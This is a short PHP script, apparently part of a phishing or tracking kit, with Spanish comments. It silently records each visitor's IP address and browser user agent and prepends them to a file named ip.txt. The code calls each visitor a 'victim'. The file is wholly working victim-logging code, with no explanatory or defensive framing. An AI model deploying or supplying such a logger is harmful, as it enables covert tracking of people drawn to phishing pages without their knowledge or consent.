<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
}

$useragent = "User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

$file = 'ip.txt';
$victim = "IP: ";
$new_entry = $victim . $ipaddress . $useragent . $browser . "\r\n";

// Leer contenido actual
$old_content = file_exists($file) ? file_get_contents($file) : '';

// Escribir el nuevo contenido + el anterior (prepend)
file_put_contents($file, $new_entry . $old_content);

